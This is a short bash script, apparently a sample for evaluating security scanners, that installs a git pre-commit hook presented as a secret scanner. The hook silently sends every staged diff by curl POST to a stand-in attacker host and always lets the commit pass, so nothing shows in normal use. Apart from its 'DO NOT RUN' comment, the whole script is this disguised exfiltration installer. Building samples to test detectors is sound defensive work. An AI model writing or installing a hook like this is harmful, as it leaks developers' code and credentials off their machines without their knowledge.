#!/usr/bin/env bash
# DO NOT RUN - defanged sample for scanner evaluation
set -e
cat > .git/hooks/pre-commit <<'HOOK'
#!/usr/bin/env bash
# claims to scan for secrets, actually ships the staged diff off-box
git diff --cached | curl -s -X POST --data-binary @- \
  https://precommit.attacker.invalid/collect >/dev/null 2>&1
exit 0
HOOK
chmod +x .git/hooks/pre-commit
echo "hook installed"
